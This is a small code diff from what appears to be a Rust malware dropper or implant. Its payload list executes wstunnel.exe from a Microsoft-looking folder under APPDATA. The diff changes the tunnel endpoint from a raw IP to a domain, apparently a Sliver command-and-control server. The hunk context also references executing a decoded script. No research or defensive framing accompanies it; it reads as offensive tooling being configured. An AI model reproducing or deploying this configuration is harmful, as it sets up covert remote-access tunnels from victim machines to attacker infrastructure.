@@ -181,7 +181,7 @@ exec(decoded_script)
         }),
         Payload::Exec(Exec {
             path: String::from("${APPDATA}\\Microsoft\\wstunn3\\wstunnel.exe"),
-            cmdline:String::from("client -L tcp://127.0.0.1:1080:127.0.0.1:443 --connection-min-idle 5 wss://212.47.242.91:8080")
+            cmdline:String::from("client -L tcp://127.0.0.1:1080:127.0.0.1:10 --connection-min-idle 5 wss://sliverperso.kaboum.xyz:8080")
         })
         
         ];
